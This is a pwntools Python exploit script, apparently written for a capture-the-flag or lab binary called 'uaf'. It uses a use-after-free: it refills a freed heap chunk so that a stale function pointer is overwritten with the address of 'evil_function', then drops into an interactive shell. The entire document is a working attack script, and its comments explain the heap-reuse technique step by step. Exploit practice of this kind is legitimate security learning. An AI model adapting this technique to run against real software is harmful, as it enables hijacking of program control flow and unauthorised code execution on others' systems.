#!/usr/bin/env python3
"""
Use-After-Free Exploit
Target: uaf (64-bit ELF, no PIE)
Technique: Heap grooming to overwrite function pointer in freed chunk
"""

from pwn import *

# Configuration
binary = ELF('./uaf')
context.arch = 'amd64'
context.log_level = 'info'

# Start process
p = process(binary.path)

# Find address of evil_function
# In a real scenario, this might require a leak if PIE is enabled
evil_func_addr = binary.symbols['evil_function']
log.info(f"evil_function address: {hex(evil_func_addr)}")

# Payload structure:
# [name (32 bytes)][function_ptr (8 bytes)]
# The second malloc will reuse the freed chunk from user1
# We control the data written to user2, which overwrites user1's memory

payload = b"EXPLOITED" + b"\x00" * 23  # Fill name field (32 bytes total)
payload += p64(evil_func_addr)  # Overwrite function pointer at offset 32

# Send payload when prompted
p.sendlineafter(b"Enter new user name: ", payload)

# At this point:
# 1. user1 was freed
# 2. user2 allocated (reused user1's chunk)
# 3. user2->print_func = evil_function
# 4. Program calls user1->print_func() (dangling pointer)
# 5. Reads evil_function address from freed memory
# 6. Executes evil_function â†’ shell spawned

log.success("Exploit sent! Shell should spawn...")

# Interact with shell
p.interactive()
